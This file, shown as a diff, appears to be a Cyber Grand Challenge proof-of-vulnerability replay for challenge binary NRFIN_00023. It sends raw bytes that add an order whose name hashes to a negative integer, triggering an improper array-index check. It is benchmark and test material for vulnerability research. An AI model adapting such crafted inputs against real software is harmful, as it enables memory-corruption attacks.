@@ -1,0 +1,16 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+    <!-- Improper validation of array index -->
+    <cbid>NRFIN_00023</cbid>
+    <replay>
+        <!-- reliability -->
+        <delay>100</delay>
+
+        <!-- Add order with name which hashes to a negative integer -->
+        <write><data>\x02\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00</data></write>
+
+        <!-- Terminate if patched -->
+        <write><data>\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</data></write>
+    </replay>
+</pov>
